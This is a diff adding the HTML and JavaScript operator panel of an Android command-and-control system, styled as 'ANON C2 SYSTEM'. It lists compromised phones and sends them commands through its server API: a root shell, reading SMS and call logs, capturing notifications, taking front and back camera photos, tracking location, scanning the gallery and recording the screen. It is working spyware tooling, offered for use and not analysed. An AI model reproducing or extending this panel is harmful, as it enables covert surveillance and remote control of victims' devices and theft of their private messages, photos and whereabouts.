@@ -1,0 +1,1101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ANON C2 SYSTEM</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        /* Terminal Noise Effect */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 0, 0.03) 0px,
+                rgba(0, 0, 0, 0.5) 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: 9999;
+            animation: scan 8s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100%); }
+        }
+        
+        /* Loading Screen */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            transition: opacity 0.5s;
+        }
+        
+        .loading-content {
+            text-align: center;
+        }
+        
+        .ascii-art {
+            color: #00ff00;
+            font-size: 12px;
+            line-height: 1.2;
+            margin-bottom: 20px;
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 5px #00ff00; }
+            to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
+        }
+        
+        .loading-bar {
+            width: 300px;
+            height: 2px;
+            background: #003300;
+            margin: 20px auto;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .loading-bar::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: #00ff00;
+            animation: loading 2s ease-in-out infinite;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        
+        @keyframes loading {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        .loading-text {
+            color: #00ff00;
+            font-size: 14px;
+            letter-spacing: 2px;
+        }
+        
+        .cursor {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+        
+        /* Main Container */
+        #main-container {
+            display: none;
+            height: 100vh;
+            padding: 20px;
+        }
+        
+        /* Device Selection Screen */
+        #device-screen {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            border-bottom: 1px solid #00ff00;
+            padding: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header-title {
+            font-size: 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+        
+        .header-title span {
+            color: #ff0000;
+        }
+        
+        .stats {
+            color: #00ff00;
+            font-size: 14px;
+        }
+        
+        .device-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            overflow-y: auto;
+            flex: 1;
+        }
+        
+        .device-card {
+            background: #111;
+            border: 1px solid #00ff00;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .device-card::before {
+            content: "";
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #00ff00, transparent, #00ff00);
+            opacity: 0;
+            transition: opacity 0.3s;
+            z-index: -1;
+        }
+        
+        .device-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+        }
+        
+        .device-card:hover::before {
+            opacity: 0.3;
+        }
+        
+        .device-card.selected {
+            background: #003300;
+            border-color: #00ff00;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+        }
+        
+        .device-name {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #00ff00;
+        }
+        
+        .device-info {
+            font-size: 12px;
+            color: #008800;
+            margin: 5px 0;
+        }
+        
+        .device-info strong {
+            color: #00ff00;
+        }
+        
+        .device-status {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #00ff00;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
+        }
+        
+        /* Dashboard Screen */
+        #dashboard-screen {
+            display: none;
+            height: 100%;
+            grid-template-columns: 250px 1fr;
+            gap: 20px;
+        }
+        
+        .sidebar {
+            background: #111;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            overflow-y: auto;
+        }
+        
+        .sidebar-menu {
+            list-style: none;
+        }
+        
+        .sidebar-menu li {
+            padding: 10px;
+            margin: 5px 0;
+            cursor: pointer;
+            border: 1px solid transparent;
+            transition: all 0.3s;
+        }
+        
+        .sidebar-menu li:hover {
+            border-color: #00ff00;
+            background: #003300;
+        }
+        
+        .sidebar-menu li.active {
+            background: #003300;
+            border-color: #00ff00;
+        }
+        
+        .main-content {
+            background: #111;
+            border: 1px solid #00ff00;
+            padding: 20px;
+            overflow-y: auto;
+            position: relative;
+        }
+        
+        /* Terminal Style */
+        .terminal {
+            background: #000;
+            padding: 15px;
+            border: 1px solid #00ff00;
+            font-family: 'Share Tech Mono', monospace;
+            height: 100%;
+            overflow-y: auto;
+        }
+        
+        .terminal-line {
+            margin: 5px 0;
+            color: #00ff00;
+        }
+        
+        .terminal-prompt {
+            color: #00ff00;
+            display: flex;
+            align-items: center;
+        }
+        
+        .terminal-prompt input {
+            background: transparent;
+            border: none;
+            color: #00ff00;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 16px;
+            flex: 1;
+            margin-left: 10px;
+            outline: none;
+        }
+        
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: #111;
+            border: 2px solid #00ff00;
+            padding: 30px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .modal-header {
+            border-bottom: 1px solid #00ff00;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .modal-close {
+            cursor: pointer;
+            font-size: 20px;
+        }
+        
+        .modal-close:hover {
+            color: #ff0000;
+        }
+        
+        /* Buttons */
+        .btn {
+            background: transparent;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 8px 15px;
+            font-family: 'Share Tech Mono', monospace;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 2px;
+        }
+        
+        .btn:hover {
+            background: #00ff00;
+            color: #000;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        
+        .btn-danger {
+            border-color: #ff0000;
+            color: #ff0000;
+        }
+        
+        .btn-danger:hover {
+            background: #ff0000;
+            color: #000;
+        }
+        
+        /* Tables */
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .data-table th,
+        .data-table td {
+            border: 1px solid #003300;
+            padding: 8px;
+            text-align: left;
+        }
+        
+        .data-table th {
+            background: #003300;
+            color: #00ff00;
+        }
+        
+        .data-table tr:hover {
+            background: #003300;
+        }
+        
+        /* App List */
+        .app-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            border: 1px solid #003300;
+            margin: 5px 0;
+        }
+        
+        .app-item:hover {
+            border-color: #00ff00;
+        }
+        
+        /* Command Input */
+        .command-panel {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .command-input {
+            flex: 1;
+            background: #000;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 10px;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        
+        .command-input:focus {
+            outline: none;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #111;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            max-width: 300px;
+            animation: slideIn 0.3s;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 5px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #111;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #00ff00;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00cc00;
+        }
+    </style>
+    
+    <!-- Socket.IO -->
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <div class="loading-content">
+            <div class="ascii-art">
+                ╔══════════════════════════════════════╗<br>
+                ║     ANONYMOUS C2 SYSTEM v1.0        ║<br>
+                ║  █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗<br>
+                ║ ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║<br>
+                ║ ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║<br>
+                ║ ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║<br>
+                ║ ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║<br>
+                ║ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝<br>
+                ╚══════════════════════════════════════╝
+            </div>
+            <div class="loading-bar"></div>
+            <div class="loading-text">
+                <span id="loading-status">INITIALIZING SYSTEM</span>
+                <span class="cursor">_</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main Container -->
+    <div id="main-container">
+        <!-- Device Selection Screen -->
+        <div id="device-screen">
+            <div class="header">
+                <div class="header-title">
+                    <span>[</span> DEVICE SELECTION <span>]</span>
+                </div>
+                <div class="stats">
+                    <span id="device-count">0</span> DEVICES ONLINE
+                </div>
+            </div>
+            
+            <div class="device-grid" id="device-grid">
+                <!-- Devices will be loaded here -->
+            </div>
+            
+            <div style="text-align: center; padding: 20px;">
+                <span class="cursor">_</span> WAITING FOR DEVICES <span class="cursor">_</span>
+            </div>
+        </div>
+        
+        <!-- Dashboard Screen -->
+        <div id="dashboard-screen">
+            <div class="sidebar">
+                <div class="header-title" style="margin-bottom: 20px;">
+                    <span>[</span> MENU <span>]</span>
+                </div>
+                
+                <ul class="sidebar-menu">
+                    <li class="active" data-view="shell">[ SHELL ]</li>
+                    <li data-view="sms">[ SMS LOGS ]</li>
+                    <li data-view="calls">[ CALL LOGS ]</li>
+                    <li data-view="apps">[ APPLICATIONS ]</li>
+                    <li data-view="camera">[ CAMERA ]</li>
+                    <li data-view="location">[ LOCATION ]</li>
+                    <li data-view="notifications">[ NOTIFICATIONS ]</li>
+                    <li data-view="gallery">[ GALLERY ]</li>
+                    <li data-view="recorder">[ SCREEN REC ]</li>
+                    <li data-view="flash">[ FLASH CONTROL ]</li>
+                    <li data-view="device">[ DEVICE INFO ]</li>
+                </ul>
+                
+                <div style="margin-top: 20px; border-top: 1px solid #003300; padding-top: 20px;">
+                    <button class="btn" onclick="disconnectDevice()" style="width: 100%;">
+                        [ DISCONNECT ]
+                    </button>
+                </div>
+            </div>
+            
+            <div class="main-content" id="main-content">
+                <!-- Shell View -->
+                <div id="view-shell" class="terminal" style="display: block;">
+                    <div id="terminal-output" style="height: calc(100% - 50px); overflow-y: auto;"></div>
+                    <div class="terminal-prompt">
+                        <span>root@device:~$</span>
+                        <input type="text" id="shell-input" placeholder="Type command...">
+                    </div>
+                </div>
+                
+                <!-- SMS View -->
+                <div id="view-sms" style="display: none;">
+                    <h3>[ SMS LOGS ]</h3>
+                    <div id="sms-container"></div>
+                </div>
+                
+                <!-- Calls View -->
+                <div id="view-calls" style="display: none;">
+                    <h3>[ CALL LOGS ]</h3>
+                    <div id="calls-container"></div>
+                </div>
+                
+                <!-- Apps View -->
+                <div id="view-apps" style="display: none;">
+                    <h3>[ INSTALLED APPLICATIONS ]</h3>
+                    <div class="command-panel">
+                        <input type="text" id="app-package" class="command-input" placeholder="Package name">
+                        <button class="btn" onclick="runApp()">[ RUN ]</button>
+                        <button class="btn" onclick="getApps()">[ REFRESH ]</button>
+                    </div>
+                    <div id="apps-container" style="margin-top: 20px;"></div>
+                </div>
+                
+                <!-- Camera View -->
+                <div id="view-camera" style="display: none;">
+                    <h3>[ CAMERA CONTROL ]</h3>
+                    <div style="text-align: center;">
+                        <button class="btn" onclick="takePhoto('front')">[ FRONT CAMERA ]</button>
+                        <button class="btn" onclick="takePhoto('back')">[ BACK CAMERA ]</button>
+                    </div>
+                    <div id="camera-output" style="margin-top: 20px; text-align: center;"></div>
+                </div>
+                
+                <!-- Location View -->
+                <div id="view-location" style="display: none;">
+                    <h3>[ LOCATION ]</h3>
+                    <button class="btn" onclick="getLocation()">[ GET LOCATION ]</button>
+                    <div id="location-output" style="margin-top: 20px;"></div>
+                </div>
+                
+                <!-- Notifications View -->
+                <div id="view-notifications" style="display: none;">
+                    <h3>[ LIVE NOTIFICATIONS ]</h3>
+                    <div id="notifications-container"></div>
+                </div>
+                
+                <!-- Gallery View -->
+                <div id="view-gallery" style="display: none;">
+                    <h3>[ GALLERY ]</h3>
+                    <button class="btn" onclick="scanGallery()">[ SCAN GALLERY ]</button>
+                    <div id="gallery-container" style="margin-top: 20px;"></div>
+                </div>
+                
+                <!-- Screen Recorder View -->
+                <div id="view-recorder" style="display: none;">
+                    <h3>[ SCREEN RECORDER ]</h3>
+                    <button class="btn" onclick="startRecording()">[ START ]</button>
+                    <button class="btn btn-danger" onclick="stopRecording()">[ STOP ]</button>
+                </div>
+                
+                <!-- Flash Control View -->
+                <div id="view-flash" style="display: none;">
+                    <h3>[ FLASH CONTROL ]</h3>
+                    <button class="btn" onclick="flashOn()">[ ON ]</button>
+                    <button class="btn btn-danger" onclick="flashOff()">[ OFF ]</button>
+                </div>
+                
+                <!-- Device Info View -->
+                <div id="view-device" style="display: none;">
+                    <h3>[ DEVICE INFORMATION ]</h3>
+                    <div id="device-info-container"></div>
+                    <button class="btn" onclick="getDeviceInfo()" style="margin-top: 20px;">[ REFRESH ]</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span id="modal-title">[ INFORMATION ]</span>
+                <span class="modal-close" onclick="closeModal()">[ X ]</span>
+            </div>
+            <div id="modal-body"></div>
+        </div>
+    </div>
+    
+    <script>
+        // Socket.IO connection
+        const socket = io();
+        let selectedDevice = null;
+        let currentView = 'shell';
+        
+        // Loading simulation
+        const loadingStatus = document.getElementById('loading-status');
+        const statuses = [
+            'ESTABLISHING SECURE CONNECTION',
+            'BYPASSING FIREWALL',
+            'LOADING MODULES',
+            'INITIALIZING INTERFACE',
+            'SYSTEM READY'
+        ];
+        
+        let i = 0;
+        const interval = setInterval(() => {
+            if (i < statuses.length) {
+                loadingStatus.textContent = statuses[i];
+                i++;
+            } else {
+                clearInterval(interval);
+                setTimeout(() => {
+                    document.getElementById('loading-screen').style.opacity = '0';
+                    setTimeout(() => {
+                        document.getElementById('loading-screen').style.display = 'none';
+                        document.getElementById('main-container').style.display = 'block';
+                        startDeviceDiscovery();
+                    }, 500);
+                }, 1000);
+            }
+        }, 800);
+        
+        // Socket events
+        socket.on('connect', () => {
+            console.log('Connected to server');
+        });
+        
+        socket.on('device_connected', (device) => {
+            addDeviceToGrid(device);
+            showNotification(`Device connected: ${device.model}`);
+        });
+        
+        socket.on('devices_list', (devices) => {
+            devices.forEach(device => addDeviceToGrid(device));
+        });
+        
+        socket.on('device_data', (data) => {
+            handleDeviceData(data);
+        });
+        
+        socket.on('new_sms', (sms) => {
+            if (currentView === 'sms') {
+                addSmsToView(sms);
+            }
+            showNotification(`New SMS from: ${sms.userSender}`);
+        });
+        
+        socket.on('new_notification', (notif) => {
+            if (currentView === 'notifications') {
+                addNotificationToView(notif);
+            }
+        });
+        
+        socket.on('new_image', (image) => {
+            if (currentView === 'camera') {
+                displayImage(image);
+            }
+        });
+        
+        // Device discovery
+        function startDeviceDiscovery() {
+            socket.emit('request_devices');
+            
+            // Poll devices via REST API
+            fetchDevices();
+            setInterval(fetchDevices, 5000);
+        }
+        
+        function fetchDevices() {
+            fetch('/api/devices')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.devices) {
+                        document.getElementById('device-grid').innerHTML = '';
+                        data.devices.forEach(device => addDeviceToGrid(device));
+                        document.getElementById('device-count').textContent = data.devices.length;
+                    }
+                });
+        }
+        
+        function addDeviceToGrid(device) {
+            const grid = document.getElementById('device-grid');
+            const card = document.createElement('div');
+            card.className = 'device-card';
+            card.onclick = () => selectDevice(device.id);
+            card.innerHTML = `
+                <div class="device-status"></div>
+                <div class="device-name">${device.model || 'Unknown Device'}</div>
+                <div class="device-info"><strong>Manufacturer:</strong> ${device.manufacturer || 'N/A'}</div>
+                <div class="device-info"><strong>Android:</strong> ${device.android_version || 'N/A'}</div>
+                <div class="device-info"><strong>Battery:</strong> ${device.battery || 'N/A'}</div>
+                <div class="device-info"><strong>IP:</strong> ${device.ip || 'N/A'}</div>
+            `;
+            grid.appendChild(card);
+        }
+        
+        function selectDevice(deviceId) {
+            fetch('/api/select_device', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: deviceId })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    selectedDevice = deviceId;
+                    
+                    // Remove selected class from all cards
+                    document.querySelectorAll('.device-card').forEach(c => {
+                        c.classList.remove('selected');
+                    });
+                    
+                    // Add selected class to clicked card
+                    event.currentTarget.classList.add('selected');
+                    
+                    // Switch to dashboard
+                    document.getElementById('device-screen').style.display = 'none';
+                    document.getElementById('dashboard-screen').style.display = 'grid';
+                    
+                    // Load device info
+                    loadDeviceInfo();
+                    
+                    showNotification(`Connected to ${data.device.model}`);
+                }
+            });
+        }
+        
+        function disconnectDevice() {
+            selectedDevice = null;
+            document.getElementById('device-screen').style.display = 'flex';
+            document.getElementById('dashboard-screen').style.display = 'none';
+        }
+        
+        // Menu navigation
+        document.querySelectorAll('.sidebar-menu li').forEach(item => {
+            item.addEventListener('click', function() {
+                document.querySelectorAll('.sidebar-menu li').forEach(li => {
+                    li.classList.remove('active');
+                });
+                this.classList.add('active');
+                
+                const viewName = this.dataset.view;
+                switchView(viewName);
+            });
+        });
+        
+        function switchView(viewName) {
+            currentView = viewName;
+            
+            // Hide all views
+            document.querySelectorAll('[id^="view-"]').forEach(view => {
+                view.style.display = 'none';
+            });
+            
+            // Show selected view
+            document.getElementById(`view-${viewName}`).style.display = 'block';
+            
+            // Load data if needed
+            switch(viewName) {
+                case 'sms':
+                    loadSmsLogs();
+                    break;
+                case 'calls':
+                    loadCallLogs();
+                    break;
+                case 'apps':
+                    getApps();
+                    break;
+                case 'device':
+                    loadDeviceInfo();
+                    break;
+            }
+        }
+        
+        // Shell functionality
+        document.getElementById('shell-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const command = this.value;
+                if (command.trim()) {
+                    executeShellCommand(command);
+                    this.value = '';
+                }
+            }
+        });
+        
+        function executeShellCommand(command) {
+            // Add command to terminal
+            const output = document.getElementById('terminal-output');
+            output.innerHTML += `<div class="terminal-line">root@device:~$ ${command}</div>`;
+            
+            // Send to server
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    command: 'shell_cmd',
+                    params: { cmd: command }
+                })
+            });
+        }
+        
+        // SMS Logs
+        function loadSmsLogs() {
+            fetch('/api/sms_logs')
+                .then(res => res.json())
+                .then(logs => {
+                    const container = document.getElementById('sms-container');
+                    container.innerHTML = logs.map(sms => `
+                        <div style="border:1px solid #003300; margin:10px; padding:10px;">
+                            <div><strong>From:</strong> ${sms.userSender || 'Unknown'}</div>
+                            <div><strong>Date:</strong> ${sms.date || 'N/A'}</div>
+                            <div><strong>Message:</strong> ${sms.content || sms.body || 'N/A'}</div>
+                        </div>
+                    `).join('');
+                });
+        }
+        
+        // Call Logs
+        function loadCallLogs() {
+            fetch('/api/call_logs')
+                .then(res => res.json())
+                .then(logs => {
+                    const container = document.getElementById('calls-container');
+                    container.innerHTML = logs.map(call => `
+                        <div style="border:1px solid #003300; margin:10px; padding:10px;">
+                            <div><strong>Number:</strong> ${call.number || 'Unknown'}</div>
+                            <div><strong>Type:</strong> ${call.call_type || 'Unknown'}</div>
+                            <div><strong>Duration:</strong> ${call.duration_seconds || 0}s</div>
+                            <div><strong>Date:</strong> ${call.date || 'N/A'}</div>
+                        </div>
+                    `).join('');
+                });
+        }
+        
+        // Apps
+        function getApps() {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'list_app' })
+            });
+            
+            // Also fetch from API
+            fetch('/api/apps')
+                .then(res => res.json())
+                .then(apps => {
+                    const container = document.getElementById('apps-container');
+                    container.innerHTML = apps.map(app => `
+                        <div class="app-item">
+                            <div>
+                                <strong>${app.appName || 'Unknown'}</strong><br>
+                                <small style="color:#008800;">${app.packageName || 'N/A'}</small>
+                            </div>
+                            <button class="btn" onclick="runApp('${app.packageName}')">[ RUN ]</button>
+                        </div>
+                    `).join('');
+                });
+        }
+        
+        function runApp(packageName) {
+            const pkg = packageName || document.getElementById('app-package').value;
+            if (pkg) {
+                fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        command: 'run',
+                        params: { package: pkg }
+                    })
+                });
+                showNotification(`Running: ${pkg}`);
+            }
+        }
+        
+        // Camera
+        function takePhoto(camera) {
+            const cmd = camera === 'front' ? 'takefrontpic' : 'takebackpic';
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: cmd })
+            });
+        }
+        
+        // Location
+        function getLocation() {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'get_location' })
+            });
+        }
+        
+        // Flash
+        function flashOn() {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'flashon' })
+            });
+        }
+        
+        function flashOff() {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'flashoff' })
+            });
+        }
+        
+        // Device Info
+        function loadDeviceInfo() {
+            fetch('/api/device_info')
+                .then(res => res.json())
+                .then(info => {
+                    if (info && !info.status) {
+                        const container = document.getElementById('device-info-container');
+                        container.innerHTML = `
+                            <div style="border:1px solid #003300; padding:20px;">
+                                <div><strong>Model:</strong> ${info.model || 'N/A'}</div>
+                                <div><strong>Manufacturer:</strong> ${info.manufacturer || 'N/A'}</div>
+                                <div><strong>Android Version:</strong> ${info.android_version || 'N/A'}</div>
+                                <div><strong>Battery:</strong> ${info.battery || 'N/A'}</div>
+                                <div><strong>IP:</strong> ${info.ip || 'N/A'}</div>
+                                <div><strong>Last Seen:</strong> ${new Date(info.last_seen).toLocaleString()}</div>
+                            </div>
+                        `;
+                    }
+                });
+        }
+        
+        function getDeviceInfo() {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'deviceinfo' })
+            });
+            loadDeviceInfo();
+        }
+        
+        // Gallery
+        function scanGallery() {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'gallery' })
+            });
+        }
+        
+        // Screen Recorder
+        function startRecording() {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'screen_recorder' })
+            });
+        }
+        
+        function stopRecording() {
+            // Implement stop recording if needed
+            showNotification('Recording stopped');
+        }
+        
+        // Helper functions
+        function handleDeviceData(data) {
+            console.log('Device data:', data);
+            
+            if (data.type === 'SHELL_RESULT') {
+                const output = document.getElementById('terminal-output');
+                output.innerHTML += `<div class="terminal-line">${data.payload}</div>`;
+                output.scrollTop = output.scrollHeight;
+            }
+        }
+        
+        function addSmsToView(sms) {
+            const container = document.getElementById('sms-container');
+            const smsDiv = document.createElement('div');
+            smsDiv.style.border = '1px solid #003300';
+            smsDiv.style.margin = '10px';
+            smsDiv.style.padding = '10px';
+            smsDiv.innerHTML = `
+                <div><strong>From:</strong> ${sms.userSender || 'Unknown'}</div>
+                <div><strong>Message:</strong> ${sms.content || sms.body || 'N/A'}</div>
+                <div><small>${new Date().toLocaleTimeString()}</small></div>
+            `;
+            container.insertBefore(smsDiv, container.firstChild);
+        }
+        
+        function addNotificationToView(notif) {
+            const container = document.getElementById('notifications-container');
+            const notifDiv = document.createElement('div');
+            notifDiv.style.border = '1px solid #003300';
+            notifDiv.style.margin = '10px';
+            notifDiv.style.padding = '10px';
+            notifDiv.innerHTML = `
+                <div><strong>${notif.packageName || 'Unknown'}</strong></div>
+                <div><strong>Title:</strong> ${notif.title || 'N/A'}</div>
+                <div><strong>Text:</strong> ${notif.text || 'N/A'}</div>
+                <div><small>${new Date().toLocaleTimeString()}</small></div>
+            `;
+            container.insertBefore(notifDiv, container.firstChild);
+        }
+        
+        function displayImage(image) {
+            const container = document.getElementById('camera-output');
+            container.innerHTML = `
+                <img src="${image.url}" style="max-width:100%; border:1px solid #00ff00;">
+                <p>${image.filename}</p>
+            `;
+        }
+        
+        function showNotification(message) {
+            const notif = document.createElement('div');
+            notif.className = 'notification';
+            notif.innerHTML = `
+                <div style="color:#00ff00;">[ SYSTEM ]</div>
+                <div>${message}</div>
+            `;
+            document.body.appendChild(notif);
+            
+            setTimeout(() => {
+                notif.remove();
+            }, 5000);
+        }
+        
+        function openModal(title, content) {
+            document.getElementById('modal-title').textContent = `[ ${title} ]`;
+            document.getElementById('modal-body').innerHTML = content;
+            document.getElementById('modal').style.display = 'flex';
+        }
+        
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
